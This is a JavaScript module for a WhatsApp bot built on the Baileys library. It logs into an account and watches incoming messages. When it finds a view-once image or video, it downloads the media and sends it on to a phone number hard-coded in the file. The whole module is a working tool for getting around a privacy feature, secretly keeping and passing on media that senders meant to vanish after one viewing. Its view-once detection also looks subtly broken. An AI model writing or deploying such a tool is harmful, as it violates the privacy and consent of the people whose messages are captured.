// Import necessary modules and declare constants
const {
    default: makeWASocket, // Function to create a WhatsApp socket connection
    DisconnectReason, // Enum for different disconnect reasons
    isJidBroadcast, // Function to check if a JID is a broadcast
    makeInMemoryStore, // Function to create an in-memory data store
    useMultiFileAuthState, // Function to manage authentication state across multiple files
    downloadMediaMessage, // Function to download media messages
} = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom"); // Error handling module
const fs = require('fs'); // File system module for file operations
const pino = require("pino"); // Logger module
const session = "baileys_auth_info"; // Session file name

// Create an in-memory store with a silent logger
const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
let sock; // Variable to hold the WhatsApp socket connection

// Function to establish a connection to WhatsApp
async function connectToWhatsApp() {
    // Load or create authentication state
    const { state, saveCreds } = await useMultiFileAuthState(session);
    // Create a WhatsApp socket connection with the loaded authentication state
    sock = makeWASocket({
        printQRInTerminal: true, // Option to print QR code in terminal for authentication
        auth: state, // Authentication state
        logger: pino({ level: "silent" }), // Logger with silent level
        shouldIgnoreJid: isJidBroadcast // Function to ignore broadcast JIDs
    });
    // Bind the in-memory store to the socket events
    store.bind(sock.ev);
    sock.multi = true; // Enable multi-device support

    // Handler for connection updates
    const handleConnectionUpdate = async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            // Determine the reason for disconnection
            const reason = lastDisconnect?.error ? new Boom(lastDisconnect.error).output.statusCode : DisconnectReason.unknown;
            // Handle session-related disconnections
            if (reason === DisconnectReason.loggedOut || reason === DisconnectReason.badSession) {
                console.log(`Session issue, deleting session and scanning again.`);
                fs.rmSync(session, { recursive: true, force: true }); // Delete session files
            }
            // Attempt to reconnect if the reason is known
            if (Object.values(DisconnectReason).includes(reason)) {
                console.log(`${DisconnectReason[reason]}, reconnecting...`);
                connectToWhatsApp(); // Reconnect
            } else {
                sock.end(`Unknown DisconnectReason: ${reason}|${lastDisconnect?.error}`); // End the connection with an error message
            }
            // Logout if logged out
            if (reason === DisconnectReason.loggedOut) {
                sock.logout(); // Logout from WhatsApp
            }
        } else if (connection === 'open') {
            console.log('Bot is ready!'); // Log when the bot is ready
            const getGroups = await sock.groupFetchAllParticipating(); // Fetch all groups the bot is participating in
            return Object.values(getGroups); // Return the groups
        }
    };

    // Register event handlers
    sock.ev.on('connection.update', handleConnectionUpdate); // Connection updates
    sock.ev.on("creds.update", saveCreds); // Credential updates

    // Handler for new messages
    const handleMessagesUpsert = async ({ messages }) => {
        const message = messages[0]; // Get the first message
        if (!message.key.fromMe) { // Check if the message is not from the bot itself
            const noWa = "6281382246185@s.whatsapp.net"; // Define the recipient JID
            // Check if the message is a view once image or video
            const isViewOnceImage = ["viewOnceMessage", "viewOnceMessageV2", "imageMessage", "videoMessage"]
                .some(type => message.message?.[type]?.message?.[type.replace('Message', '')]?.viewOnce);

            if (isViewOnceImage) { // If it's a view once image or video
                // Download the media message
                const buffer = await downloadMediaMessage(
                    message,
                    'buffer',
                    {},
                    { reuploadRequest: sock.updateMediaMessage }
                );
                await sock.sendMessage(noWa, { image: buffer }); // Send the downloaded media to the specified recipient
            }
        }
    };

    // Register the message handler
    sock.ev.on("messages.upsert", handleMessagesUpsert); // New messages
}

// Export the connectToWhatsApp function
module.exports = {
    connectToWhatsApp,
}